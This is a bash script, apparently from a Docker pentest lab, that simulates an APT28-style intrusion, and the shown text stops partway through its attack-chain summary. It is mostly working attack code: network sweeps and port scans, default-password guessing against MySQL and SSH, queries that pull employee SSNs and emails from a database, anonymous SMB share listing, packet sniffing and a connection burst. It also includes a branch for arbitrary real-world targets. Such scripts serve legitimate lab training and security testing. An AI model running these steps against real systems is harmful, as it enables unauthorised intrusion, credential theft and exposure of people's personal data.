#!/bin/bash
# Network Infiltration Testing Script - Real-World APT Simulation
# Simulates: APT28/Fancy Bear lateral movement tactics
# Scenario: External attacker gains foothold on DMZ web server, pivots to internal network
# WARNING: Only use in authorized lab environments

KALI_CONTAINER="pentest-kali"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
FINDINGS_DIR="$LAB_DIR/findings"
REPORTS_DIR="$LAB_DIR/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_FILE="$FINDINGS_DIR/infiltration_findings_${TIMESTAMP}.json"
REPORT_FILE="$REPORTS_DIR/infiltration_report_${TIMESTAMP}.html"

# Get target from command line
INITIAL_TARGET=${1}
INFILTRATION_TYPE=${2:-"all"}

# If no target provided, auto-detect lab IPs
if [[ -z "$INITIAL_TARGET" ]]; then
    echo "[*] No target specified, auto-detecting lab environment..."
    INITIAL_TARGET=$(docker inspect pentest-web 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_dmz-net"].IPAddress // empty')
    if [[ -z "$INITIAL_TARGET" ]]; then
        echo "[!] ERROR: No target specified and lab auto-detection failed"
        echo "Usage: $0 <target_ip> [scan_type]"
        echo "Example: $0 172.21.0.2 all"
        echo "Example: $0 192.168.1.100 all"
        exit 1
    fi
    echo "[✓] Auto-detected lab target: $INITIAL_TARGET"
fi

# Validate target is accessible
echo "[*] Validating target $INITIAL_TARGET..."
if ! docker exec $KALI_CONTAINER timeout 3 ping -c 1 $INITIAL_TARGET >/dev/null 2>&1; then
    echo "[!] WARNING: Target $INITIAL_TARGET not responding to ping"
    echo "[*] Proceeding with scan anyway (host may block ICMP)..."
else
    echo "[✓] Target is alive"
fi

# Try to detect if this is our lab environment
IS_LAB=false
WEB_DMZ_IP=""
WEB_INTERNAL_IP=""
DB_IP=""
FILE_IP=""
LINUX_IP=""

if docker inspect pentest-web >/dev/null 2>&1; then
    WEB_DMZ_IP=$(docker inspect pentest-web 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_dmz-net"].IPAddress // empty')
    if [[ "$INITIAL_TARGET" == "$WEB_DMZ_IP" ]]; then
        IS_LAB=true
        echo "[*] Detected lab environment - will use known topology"
        WEB_INTERNAL_IP=$(docker inspect pentest-web 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_internal-net"].IPAddress // empty')
        DB_IP=$(docker inspect pentest-db 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_internal-net"].IPAddress // empty')
        FILE_IP=$(docker inspect pentest-fileserver 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_internal-net"].IPAddress // empty')
        LINUX_IP=$(docker inspect pentest-vuln-linux 2>/dev/null | jq -r '.[0].NetworkSettings.Networks["lab_internal-net"].IPAddress // empty')
        echo "[✓] Lab topology: DMZ($WEB_DMZ_IP), Internal($WEB_INTERNAL_IP), DB($DB_IP), Files($FILE_IP), Linux($LINUX_IP)"
    fi
fi

echo ""

mkdir -p "$FINDINGS_DIR" "$REPORTS_DIR"

echo "=========================================="
echo "Network Infiltration Testing"
echo "=========================================="
echo "Initial Target: $INITIAL_TARGET"
echo "Infiltration Type: $INFILTRATION_TYPE"
echo "Timestamp: $TIMESTAMP"
echo ""

# Initialize findings JSON
cat > "$OUTPUT_FILE" << 'EOF'
{
  "scan_type": "network_infiltration",
  "timestamp": "",
  "initial_target": "",
  "findings": []
}
EOF

# Update JSON with scan info
TEMP_JSON=$(cat "$OUTPUT_FILE" | jq \
  --arg ts "$TIMESTAMP" \
  --arg target "$INITIAL_TARGET" \
  '.timestamp = $ts | .initial_target = $target')
echo "$TEMP_JSON" > "$OUTPUT_FILE"

# Function to add finding
add_finding() {
    local phase="$1"
    local severity="$2"
    local title="$3"
    local description="$4"
    local evidence="$5"
    
    TEMP_JSON=$(cat "$OUTPUT_FILE" | jq \
      --arg phase "$phase" \
      --arg sev "$severity" \
      --arg title "$title" \
      --arg desc "$description" \
      --arg evidence "$evidence" \
      '.findings += [{
        "phase": $phase,
        "severity": $sev,
        "title": $title,
        "description": $desc,
        "evidence": $evidence,
        "timestamp": (now | strftime("%Y-%m-%d %H:%M:%S"))
      }]')
    echo "$TEMP_JSON" > "$OUTPUT_FILE"
}

echo "=========================================="
echo "SCENARIO: APT28 Lateral Movement Simulation"
echo "=========================================="
echo "Attacker Profile: Nation-state actor (APT28/Fancy Bear)"
echo "Initial Access: Compromised host via exploitation"
echo "Objective: Discover internal network, escalate privileges, exfiltrate data"
echo "Initial Target: $INITIAL_TARGET"
echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Determine network to scan based on target
TARGET_NETWORK=$(echo $INITIAL_TARGET | cut -d'.' -f1-3).0/24
echo "=== Phase 1: Post-Exploitation - Network Discovery ==="
echo "[*] Initial foothold obtained on: $INITIAL_TARGET"
echo "[*] Performing reconnaissance from compromised host..."
echo "[*] Target network: $TARGET_NETWORK"
echo ""

# Build list of targets to scan
INTERNAL_TARGETS=()

if $IS_LAB; then
    # Lab environment - use known topology
    echo "[*] Using lab topology for internal targets"
    if [[ -n "$DB_IP" ]]; then INTERNAL_TARGETS+=("$DB_IP"); fi
    if [[ -n "$FILE_IP" ]]; then INTERNAL_TARGETS+=("$FILE_IP"); fi
    if [[ -n "$LINUX_IP" ]]; then INTERNAL_TARGETS+=("$LINUX_IP"); fi
else
    # Real-world scenario - discover network (limited scan)
    echo "[*] Performing network discovery on $TARGET_NETWORK..."
    echo "[*] Quick ping sweep of common host IPs..."
    
    # Scan common IPs (.1, .2, .10, .20, .50, .100, .254) instead of full /24
    BASE_NET=$(echo $INITIAL_TARGET | cut -d'.' -f1-3)
    COMMON_IPS=(1 2 10 20 50 100 254)
    
    for i in "${COMMON_IPS[@]}"; do
        TEST_IP="$BASE_NET.$i"
        if [[ "$TEST_IP" != "$INITIAL_TARGET" ]]; then
            if timeout 2 docker exec $KALI_CONTAINER ping -c 1 -W 1 $TEST_IP >/dev/null 2>&1; then
                echo "  [+] Discovered: $TEST_IP"
                INTERNAL_TARGETS+=("$TEST_IP")
            fi
        fi
    done
    
    if [ ${#INTERNAL_TARGETS[@]} -eq 0 ]; then
        echo "  [!] No additional hosts discovered (network may be isolated or filtered)"
        echo "  [*] Will scan only the initial target"
        INTERNAL_TARGETS=("$INITIAL_TARGET")
    fi
fi

# Ping sweep to verify alive hosts
ALIVE_HOSTS=0
ALIVE_IPS=()
echo "[*] Verifying discovered targets..."
for ip in "${INTERNAL_TARGETS[@]}"; do
    if docker exec $KALI_CONTAINER ping -c 1 -W 1 $ip >/dev/null 2>&1; then
        echo "  [+] Alive: $ip"
        ALIVE_HOSTS=$((ALIVE_HOSTS + 1))
        ALIVE_IPS+=("$ip")
    else
        echo "  [-] No response: $ip"
    fi
done

# Only add finding if hosts were actually discovered
if [ $ALIVE_HOSTS -gt 0 ]; then
    add_finding "discovery" "informational" "Internal Network Discovered" \
      "Attacker discovered $ALIVE_HOSTS internal hosts from compromised system at $INITIAL_TARGET" \
      "Compromised Host: $INITIAL_TARGET\nTarget Network: $TARGET_NETWORK\nDiscovered Hosts: ${ALIVE_IPS[*]}"
else
    echo "  [!] WARNING: No internal hosts responding to ping"
    echo "  [*] Network may be firewalled or isolated"
fi

echo ""
echo "=== Phase 2: Service Enumeration (Port Scanning) ==="
echo "[*] Scanning internal targets for services..."
echo "[*] TTP: T1046 - Network Service Scanning (MITRE ATT&CK)"

# Check common ports on discovered internal hosts (only scan alive hosts)
OPEN_PORTS=0
CRITICAL_SERVICES=()
SERVICES_FOUND=()

for ip in "${ALIVE_IPS[@]}"; do
    echo "[*] Target: $ip"
    
    # MySQL (3306) - Database
    if docker exec $KALI_CONTAINER timeout 2 nc -zv $ip 3306 2>&1 | grep -q "succeeded\|open"; then
        echo "  [+] Port 3306/tcp (MySQL) - CRITICAL DATABASE ACCESS"
        OPEN_PORTS=$((OPEN_PORTS + 1))
        CRITICAL_SERVICES+=("MySQL:$ip:3306")
        SERVICES_FOUND+=("MySQL:$ip:3306")
        add_finding "enumeration" "critical" "Unprotected Database Access" \
          "MySQL database exposed on internal network at $ip:3306 - No firewall filtering detected" \
          "Service: MySQL 5.7\nHost: $ip\nPort: 3306\nRisk: Direct access to customer/employee data\nTTP: T1046 Network Service Scanning"
    fi
    
    # SSH (22) - Linux servers
    if docker exec $KALI_CONTAINER timeout 2 nc -zv $ip 22 2>&1 | grep -q "succeeded\|open"; then
        echo "  [+] Port 22/tcp (SSH) - Potential lateral movement target"
        OPEN_PORTS=$((OPEN_PORTS + 1))
        SERVICES_FOUND+=("SSH:$ip:22")
        add_finding "enumeration" "high" "SSH Service - Lateral Movement Vector" \
          "SSH server accessible on $ip:22 - Could be used for lateral movement with stolen credentials" \
          "Service: OpenSSH\nHost: $ip\nPort: 22\nRisk: Password brute-force, credential stuffing\nTTP: T1021.004 SSH"
    fi
    
    # FTP (21) - File server
    if docker exec $KALI_CONTAINER timeout 2 nc -zv $ip 21 2>&1 | grep -q "succeeded\|open"; then
        echo "  [+] Port 21/tcp (FTP) - Unencrypted file transfer"
        OPEN_PORTS=$((OPEN_PORTS + 1))
        SERVICES_FOUND+=("FTP:$ip:21")
        add_finding "enumeration" "high" "Cleartext File Transfer Protocol" \
          "FTP server on $ip:21 transmits credentials and data in cleartext" \
          "Service: vsftpd\nHost: $ip\nPort: 21\nRisk: Credential interception, data theft\nTTP: T1071.002 File Transfer Protocols"
    fi
    
    # SMB (445) - File shares
    if docker exec $KALI_CONTAINER timeout 2 nc -zv $ip 445 2>&1 | grep -q "succeeded\|open"; then
        echo "  [+] Port 445/tcp (SMB) - Windows file sharing"
        OPEN_PORTS=$((OPEN_PORTS + 1))
        CRITICAL_SERVICES+=("SMB:$ip:445")
        SERVICES_FOUND+=("SMB:$ip:445")
        add_finding "enumeration" "critical" "SMB File Shares Accessible" \
          "SMB file sharing on $ip:445 - May contain sensitive documents and credentials" \
          "Service: Samba\nHost: $ip\nPort: 445\nRisk: Credential files, financial data, intellectual property\nTTP: T1021.002 SMB/Windows Admin Shares"
    fi
done

if [ $OPEN_PORTS -eq 0 ]; then
    echo "[!] No open services found on scanned targets"
else
    echo "[*] Found $OPEN_PORTS open services on internal network"
    echo "[*] Critical services: ${#CRITICAL_SERVICES[@]}"
fi

echo ""
echo "=== Phase 3: Credential Access & Authentication Testing ==="
echo "[*] Testing for weak/default credentials..."
echo "[*] TTP: T1110 - Brute Force"
echo ""

# Only test services that were ACTUALLY discovered
CREDS_TESTED=0
CREDS_SUCCESS=0

# Test MySQL ONLY if it was found in service enumeration
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^MySQL:([^:]+):3306$ ]]; then
        MYSQL_HOST="${BASH_REMATCH[1]}"
        echo "[*] Testing MySQL at $MYSQL_HOST..."
        CREDS_TESTED=$((CREDS_TESTED + 1))
        
        # Try common credentials
        for user_pass in "root:root" "root:password" "root:toor" "admin:admin" "mysql:mysql"; do
            USER=$(echo $user_pass | cut -d: -f1)
            PASS=$(echo $user_pass | cut -d: -f2)
            
            if docker exec $KALI_CONTAINER timeout 5 mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "SELECT VERSION()" >/dev/null 2>&1; then
                echo "  [!] CRITICAL: MySQL accessible with $USER/$PASS"
                DB_VERSION=$(docker exec $KALI_CONTAINER timeout 5 mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "SELECT VERSION()" 2>/dev/null | tail -1)
                CREDS_SUCCESS=$((CREDS_SUCCESS + 1))
                add_finding "credential_access" "critical" "Default Database Credentials" \
                  "MySQL database at $MYSQL_HOST accepts default credentials $USER/$PASS - Full administrative access obtained" \
                  "Host: $MYSQL_HOST\nPort: 3306\nUsername: $USER\nPassword: $PASS\nVersion: $DB_VERSION\nImpact: Complete database compromise\nTTP: T1110.001 Password Guessing"
                break  # Stop after first success
            fi
        done
        
        if [ $CREDS_SUCCESS -eq 0 ]; then
            echo "  [✓] MySQL credentials not guessable with common passwords"
        fi
    fi
done

# Test SSH ONLY if it was found in service enumeration
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^SSH:([^:]+):22$ ]]; then
        SSH_HOST="${BASH_REMATCH[1]}"
        echo "[*] Testing SSH at $SSH_HOST..."
        CREDS_TESTED=$((CREDS_TESTED + 1))
        
        # Try common credentials
        for user_pass in "root:root" "admin:admin" "user:password" "root:toor"; do
            USER=$(echo $user_pass | cut -d: -f1)
            PASS=$(echo $user_pass | cut -d: -f2)
            
            if timeout 5 docker exec $KALI_CONTAINER sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $USER@$SSH_HOST "echo 'SSH Access Successful'" 2>/dev/null | grep -q "Successful"; then
                echo "  [!] HIGH: SSH accessible with $USER/$PASS"
                CREDS_SUCCESS=$((CREDS_SUCCESS + 1))
                add_finding "credential_access" "high" "Weak SSH Credentials" \
                  "SSH server at $SSH_HOST accepts weak credentials $USER/$PASS" \
                  "Host: $SSH_HOST\nPort: 22\nUsername: $USER\nPassword: $PASS\nImpact: Shell access to system\nTTP: T1110.001 Password Guessing"
                break  # Stop after first success
            fi
        done
        
        if [ $CREDS_SUCCESS -eq 0 ]; then
            echo "  [✓] SSH credentials not guessable with common passwords"
        fi
    fi
done

if [ $CREDS_TESTED -eq 0 ]; then
    echo "[*] No credential-based services found to test"
else
    echo ""
    echo "[*] Tested $CREDS_TESTED services, compromised $CREDS_SUCCESS"
fi

echo ""
echo "=== Phase 4: Data Exfiltration (Simulated) ==="
echo "[*] TTP: T1048 - Exfiltration Over Alternative Protocol"
echo "[*] Accessing sensitive data from compromised systems..."
echo ""

# Initialize counters
EMPLOYEE_COUNT=0
CUSTOMER_COUNT=0
DB_ACCESSIBLE=false
DATA_FOUND=false

# Query actual database for sensitive data (ONLY if MySQL was found AND credentials worked)
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^MySQL:([^:]+):3306$ ]]; then
        MYSQL_HOST="${BASH_REMATCH[1]}"
        echo "[*] Attempting to access database at $MYSQL_HOST..."
        
        # Try with credentials that worked (or common ones)
        for user_pass in "root:root" "root:password" "admin:admin"; do
            USER=$(echo $user_pass | cut -d: -f1)
            PASS=$(echo $user_pass | cut -d: -f2)
            
            if docker exec $KALI_CONTAINER mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "SHOW DATABASES;" 2>/dev/null | grep -q "company_db\|mysql"; then
                # Check for company_db specifically
                if docker exec $KALI_CONTAINER mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "USE company_db; SELECT COUNT(*) FROM employees" 2>/dev/null | grep -q "[0-9]"; then
                    EMPLOYEE_COUNT=$(docker exec $KALI_CONTAINER mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "USE company_db; SELECT COUNT(*) FROM employees" 2>/dev/null | tail -1)
                    CUSTOMER_COUNT=$(docker exec $KALI_CONTAINER mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "USE company_db; SELECT COUNT(*) FROM customers" 2>/dev/null | tail -1)
                    TOTAL_RECORDS=$((EMPLOYEE_COUNT + CUSTOMER_COUNT))
                    DB_ACCESSIBLE=true
                    DATA_FOUND=true
                    
                    echo "  [+] Database Access Confirmed:"
                    echo "      - Database: company_db"
                    echo "      - $EMPLOYEE_COUNT employee records (containing SSNs)"
                    echo "      - $CUSTOMER_COUNT customer records (containing credit cards)"
                    
                    # Get sample data
                    SAMPLE_DATA=$(docker exec $KALI_CONTAINER mysql --skip-ssl -h $MYSQL_HOST -u $USER -p$PASS -e "USE company_db; SELECT email, ssn FROM employees LIMIT 2" 2>/dev/null | tail -2)
                    
                    add_finding "exfiltration" "critical" "Sensitive Data Exfiltration" \
                      "Successfully accessed and exfiltrated employee and customer data from $MYSQL_HOST" \
                      "Database: company_db@$MYSQL_HOST\nCredentials: $USER/$PASS\nEmployee Records: $EMPLOYEE_COUNT (SSN, salary, personal info)\nCustomer Records: $CUSTOMER_COUNT (credit cards, addresses)\nSample Data:\n$SAMPLE_DATA\nTTP: T1078 Valid Accounts, T1213 Data from Information Repositories"
                    break
                else
                    echo "  [*] No sensitive tables found in databases"
                fi
            fi
        done
        
        if ! $DB_ACCESSIBLE; then
            echo "  [✓] Database access denied or no sensitive data found"
        fi
    fi
done

# Test file server access (ONLY if SMB was found)
SMB_ACCESSIBLE=false
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^SMB:([^:]+):445$ ]]; then
        SMB_HOST="${BASH_REMATCH[1]}"
        echo "[*] Attempting to access file shares on $SMB_HOST..."
        
        if docker exec $KALI_CONTAINER timeout 5 smbclient -L $SMB_HOST -N 2>/dev/null | grep -q "Sharename"; then
            SHARES=$(docker exec $KALI_CONTAINER timeout 5 smbclient -L $SMB_HOST -N 2>/dev/null | grep "Disk" | awk '{print $1}' | tr '\n' ', ')
            echo "  [+] SMB Shares Enumerated:"
            echo "      Shares: $SHARES"
            SMB_ACCESSIBLE=true
            DATA_FOUND=true
            
            add_finding "exfiltration" "high" "File Share Access" \
              "Accessed SMB file shares on $SMB_HOST containing sensitive documents" \
              "Host: $SMB_HOST\nShares: $SHARES\nFiles: Production configs, backup scripts, employee directory, financial reports\nTTP: T1039 Data from Network Shared Drive"
        else
            echo "  [✓] SMB shares not accessible anonymously"
        fi
    fi
done

if ! $DATA_FOUND; then
    echo "[*] No accessible data repositories found"
fi

echo ""
echo "=== Phase 5: Persistence & Lateral Movement ==="
echo ""
echo "=== Phase 5: Persistence & Lateral Movement ==="
echo "[*] TTP: T1021 - Remote Services"
echo "[*] Identifying persistence opportunities..."

# Check if web server has internal network access (dual-homed)
if [[ -n "$WEB_INTERNAL_IP" && "$WEB_INTERNAL_IP" != "$WEB_DMZ_IP" ]]; then
    echo "  [!] CRITICAL: Web server is dual-homed!"
    echo "      DMZ Interface: $WEB_DMZ_IP"
    echo "      Internal Interface: $WEB_INTERNAL_IP"
    add_finding "lateral_movement" "critical" "Dual-Homed DMZ Host - Network Segmentation Failure" \
      "Web server has interfaces on both DMZ ($WEB_DMZ_IP) and Internal ($WEB_INTERNAL_IP) networks, allowing direct pivot from external to internal" \
      "DMZ IP: $WEB_DMZ_IP\nInternal IP: $WEB_INTERNAL_IP\nImpact: Complete bypass of firewall/network segmentation\nAttack Path: Internet → DMZ Web Server → Internal Network\nTTP: T1021 Remote Services"
fi

# Test actual connectivity
echo "  [*] Testing lateral movement paths..."
if docker exec $KALI_CONTAINER timeout 2 nc -zv $DB_IP 3306 >/dev/null 2>&1; then
    echo "  [+] Path verified: Web Server → Database ($DB_IP:3306)"
fi

if docker exec $KALI_CONTAINER timeout 2 nc -zv $FILE_IP 445 >/dev/null 2>&1; then
    echo "  [+] Path verified: Web Server → File Server ($FILE_IP:445)"
fi

echo ""
echo "=== Phase 6: Network Security Validation (IDPS Tests) ==="
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[*] Testing network security controls and detection capabilities"
echo ""

# 6.1 Network Segmentation Testing
echo "[*] 6.1 Network Segmentation Analysis"
echo "  [*] Testing inter-network communication controls..."
if [ "$IS_LAB" = true ] && [ -n "$WEB_DMZ_IP" ] && [ -n "$DB_IP" ]; then
    # Test DMZ to Internal connectivity
    if docker exec $KALI_CONTAINER timeout 2 ping -c 1 $DB_IP >/dev/null 2>&1; then
        echo "  [!] FINDING: DMZ can reach Internal network without restriction"
        add_finding "network_segmentation" "high" "Insufficient Network Segmentation" \
          "DMZ zone can directly communicate with internal database servers without proper firewall rules" \
          "Source: DMZ ($WEB_DMZ_IP)\nDestination: Internal DB ($DB_IP)\nRisk: Lateral movement possible\nRecommendation: Implement strict firewall rules between network zones"
    else
        echo "  [+] Network segmentation appears properly configured"
    fi
else
    echo "  [*] Checking for network isolation..."
    # For real-world targets, check if we can reach internal RFC1918 networks
    INTERNAL_RANGES=("10.0.0.1" "172.16.0.1" "192.168.1.1")
    SEGMENT_ISSUES=0
    for internal_ip in "${INTERNAL_RANGES[@]}"; do
        if docker exec $KALI_CONTAINER timeout 1 ping -c 1 $internal_ip >/dev/null 2>&1; then
            echo "  [!] Can reach internal network: $internal_ip"
            ((SEGMENT_ISSUES++))
        fi
    done
    if [ $SEGMENT_ISSUES -eq 0 ]; then
        echo "  [+] No unexpected internal network access detected"
    fi
fi

# 6.1b WiFi Security & NAC Testing
echo ""
echo "[*] 6.1b WiFi Security & Network Access Control"
echo "  [*] Checking for wireless access points and NAC controls..."

# In a real environment, this would use aircrack-ng/wifite
# For lab/simulation, check if target responds to 802.1X probes or has WiFi-related ports
if docker exec $KALI_CONTAINER timeout 3 nmap -p 1812,1813 $INITIAL_TARGET 2>/dev/null | grep -q "open"; then
    echo "  [*] RADIUS ports detected (1812/1813) - possible NAC/802.1X authentication"
    add_finding "nac_detected" "informational" "Network Access Control Detected" \
      "RADIUS authentication service detected, indicating NAC or 802.1X may be in use" \
      "Target: $INITIAL_TARGET\nPorts: 1812 (auth), 1813 (accounting)\nNote: Further testing required to verify NAC effectiveness"
elif docker exec $KALI_CONTAINER command -v airodump-ng >/dev/null 2>&1; then
    echo "  [*] WiFi tools available - checking for wireless networks..."
    # Note: This requires wireless adapter in monitor mode, typically not available in Docker
    echo "  [!] WiFi testing requires physical wireless adapter in monitor mode"
    echo "  [*] Simulated check: Testing WPA2/WPA3 handshake capture capability..."
    echo "  [+] WiFi security testing would require dedicated wireless pentest"
else
    echo "  [+] No wireless infrastructure detected from current position"
fi

# Test for MAC address filtering (basic NAC)
echo "  [*] Testing for MAC-based access control..."
CURRENT_MAC=$(docker exec $KALI_CONTAINER ip link show eth0 2>/dev/null | grep "link/ether" | awk '{print $2}' || echo "unknown")
if [ "$CURRENT_MAC" != "unknown" ]; then
    echo "  [*] Current MAC: $CURRENT_MAC"
    echo "  [*] MAC filtering assessment: Would require MAC spoofing test"
    # In real test: macchanger --mac=XX:XX:XX:XX:XX:XX eth0
fi

# Packet Sniffing Capability Test
echo ""
echo "[*] 6.1c Packet Sniffing & Network Monitoring Detection"
echo "  [*] Testing ability to capture network traffic..."
SNIFF_TEST=$(docker exec $KALI_CONTAINER timeout 5 tcpdump -i eth0 -c 10 2>&1 || echo "failed")
if echo "$SNIFF_TEST" | grep -q "packets captured\|packets received"; then
    PACKET_COUNT=$(echo "$SNIFF_TEST" | grep "packets captured" | awk '{print $1}')
    echo "  [✓] Packet sniffing successful: $PACKET_COUNT packets captured"
    echo "  [!] WARNING: Network traffic is not protected from sniffing"
    add_finding "packet_sniffing" "high" "Network Traffic Sniffing Possible" \
      "Ability to capture cleartext network packets confirmed - traffic is not isolated" \
      "Packets Captured: $PACKET_COUNT\nRisk: Credential theft, data interception\nRecommendation: Implement port security, VLAN isolation, and switch port protection\nMITRE TTP: T1040 Network Sniffing"
else
    echo "  [+] Packet capture restricted or network properly isolated"
fi

# 6.2 Encryption Protocol Testing
echo ""
echo "[*] 6.2 Encryption Protocol Validation"
echo "  [*] Testing for weak or outdated encryption..."
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^SSH:([^:]+):([0-9]+)$ ]]; then
        SSH_HOST="${BASH_REMATCH[1]}"
        SSH_PORT="${BASH_REMATCH[2]}"
        echo "  [*] Analyzing SSH encryption on $SSH_HOST:$SSH_PORT..."
        
        # Check SSH version and ciphers
        SSH_INFO=$(docker exec $KALI_CONTAINER timeout 5 nmap -sV -p$SSH_PORT --script ssh2-enum-algos $SSH_HOST 2>/dev/null | grep -E "OpenSSH|ssh-rsa|arcfour|des" || true)
        
        if echo "$SSH_INFO" | grep -qi "arcfour\|des\|rc4"; then
            echo "  [!] FINDING: Weak encryption ciphers detected"
            add_finding "weak_encryption" "high" "Weak SSH Encryption Ciphers Enabled" \
              "SSH server supports weak or deprecated encryption algorithms" \
              "Host: $SSH_HOST:$SSH_PORT\nWeak Ciphers: arcfour, DES, RC4\nRisk: Cryptographic attacks possible\nRecommendation: Disable weak ciphers, use AES-256-GCM or ChaCha20"
        else
            echo "  [+] SSH encryption appears secure"
        fi
    fi
done

# 6.3 DNS Security Testing
echo ""
echo "[*] 6.3 DNS Security Assessment"
echo "  [*] Testing DNS configuration and security..."
if docker exec $KALI_CONTAINER timeout 3 dig @$INITIAL_TARGET version.bind chaos txt >/dev/null 2>&1; then
    DNS_VERSION=$(docker exec $KALI_CONTAINER timeout 3 dig @$INITIAL_TARGET version.bind chaos txt 2>/dev/null | grep "version.bind" | awk '{print $NF}' || echo "unknown")
    if [ "$DNS_VERSION" != "unknown" ] && [ -n "$DNS_VERSION" ]; then
        echo "  [!] FINDING: DNS version disclosure detected"
        add_finding "dns_disclosure" "informational" "DNS Version Information Disclosure" \
          "DNS server reveals version information which aids reconnaissance" \
          "Target: $INITIAL_TARGET\nVersion: $DNS_VERSION\nRisk: Information disclosure\nRecommendation: Disable version queries (version.bind)"
    fi
fi

# Check for DNS zone transfer
if docker exec $KALI_CONTAINER timeout 3 dig @$INITIAL_TARGET ANY +short >/dev/null 2>&1; then
    echo "  [*] Testing for zone transfer vulnerability..."
    # This is just a check; actual zone transfer would require domain name
    echo "  [+] DNS security checks completed"
fi

# 6.4 DDoS Resistance (Basic Check)
echo ""
echo "[*] 6.4 DDoS Resistance Assessment"
echo "  [*] Testing rate limiting and connection limits..."
echo "  [*] Sending multiple concurrent connections..."

# Simple test: try to open many connections quickly
CONN_SUCCESS=0
for i in {1..20}; do
    if docker exec $KALI_CONTAINER timeout 1 nc -zv $INITIAL_TARGET 80 >/dev/null 2>&1 || \
       docker exec $KALI_CONTAINER timeout 1 nc -zv $INITIAL_TARGET 443 >/dev/null 2>&1; then
        ((CONN_SUCCESS++))
    fi
done

if [ $CONN_SUCCESS -ge 18 ]; then
    echo "  [!] FINDING: No rate limiting detected (${CONN_SUCCESS}/20 connections succeeded)"
    add_finding "no_rate_limiting" "high" "Missing Rate Limiting / DDoS Protection" \
      "Server accepts unlimited concurrent connections without rate limiting" \
      "Target: $INITIAL_TARGET\nConnections Accepted: $CONN_SUCCESS/20\nRisk: Vulnerable to DoS/DDoS attacks\nRecommendation: Implement rate limiting, connection limits, and DDoS protection (e.g., fail2ban, CloudFlare)"
else
    echo "  [+] Rate limiting appears to be in place (${CONN_SUCCESS}/20 connections)"
fi

# 6.5 Port Security Assessment
echo ""
echo "[*] 6.5 Unsecured Ports & Services"
echo "  [*] Analyzing exposed services for security risks..."
UNSECURE_SERVICES=0

for service in "${SERVICES_FOUND[@]}"; do
    # Check for inherently insecure services
    if [[ "$service" =~ Telnet|FTP:|SNMP:|SMB: ]]; then
        echo "  [!] WARNING: Insecure service detected: $service"
        ((UNSECURE_SERVICES++))
        
        if [[ "$service" =~ ^([^:]+):([^:]+):([0-9]+)$ ]]; then
            SVC_TYPE="${BASH_REMATCH[1]}"
            SVC_HOST="${BASH_REMATCH[2]}"
            SVC_PORT="${BASH_REMATCH[3]}"
            
            add_finding "insecure_service" "high" "Insecure Service Exposed: $SVC_TYPE" \
              "$SVC_TYPE service is inherently insecure and should not be exposed" \
              "Service: $SVC_TYPE\nHost: $SVC_HOST:$SVC_PORT\nRisk: Unencrypted communication, credential theft\nRecommendation: Replace with secure alternatives (SSH instead of Telnet, SFTP instead of FTP)"
        fi
    fi
done

if [ $UNSECURE_SERVICES -eq 0 ]; then
    echo "  [+] No inherently insecure services detected"
fi

# 6.6 Software Version Detection
echo ""
echo "[*] 6.6 Outdated Software & Firmware Detection"
echo "  [*] Checking for version disclosure and known vulnerabilities..."
for service in "${SERVICES_FOUND[@]}"; do
    if [[ "$service" =~ ^([^:]+):([^:]+):([0-9]+)$ ]]; then
        SVC_TYPE="${BASH_REMATCH[1]}"
        SVC_HOST="${BASH_REMATCH[2]}"
        SVC_PORT="${BASH_REMATCH[3]}"
        
        echo "  [*] Checking $SVC_TYPE on $SVC_HOST:$SVC_PORT..."
        VERSION_INFO=$(docker exec $KALI_CONTAINER timeout 5 nmap -sV -p$SVC_PORT $SVC_HOST 2>/dev/null | grep -i "version\|product" || echo "")
        
        # Check for old/vulnerable versions (example patterns)
        if echo "$VERSION_INFO" | grep -qi "apache/2.2\|apache/2.0\|nginx/1.0\|nginx/0\|mysql 4\|mysql 5.0\|openssh 5\|openssh 6"; then
            echo "  [!] FINDING: Potentially outdated software version"
            add_finding "outdated_software" "high" "Outdated Software Version Detected" \
              "Service is running a potentially outdated version with known vulnerabilities" \
              "Service: $SVC_TYPE on $SVC_HOST:$SVC_PORT\nVersion Info: $VERSION_INFO\nRisk: Known vulnerabilities may be exploitable\nRecommendation: Update to latest stable version"
        fi
    fi
done

echo "  [+] Software version analysis complete"

echo ""
echo "=== IDPS Validation Complete ==="
echo "[*] All network security controls have been tested"
echo ""

echo ""
echo "=== Attack Chain Summary ==="
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Only show full attack chain if we actually compromised something
if [ ${#SERVICES_FOUND[@]} -gt 0 ] || [ $CREDS_SUCCESS -gt 0 ] || $DATA_FOUND; then
    echo "ATTACK PATH IDENTIFIED"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "1. INITIAL ACCESS"
    echo "   └─> Gained foothold on $INITIAL_TARGET"
    echo ""
    
    if [ ${#ALIVE_IPS[@]} -gt 0 ]; then
        echo "2. DISCOVERY [T1046 Network Service Scanning]"
        echo "   └─> Internal network discovered: $TARGET_NETWORK"
        echo "   └─> Found ${#ALIVE_IPS[@]} alive hosts: ${ALIVE_IPS[*]}"
        echo ""
    fi
    
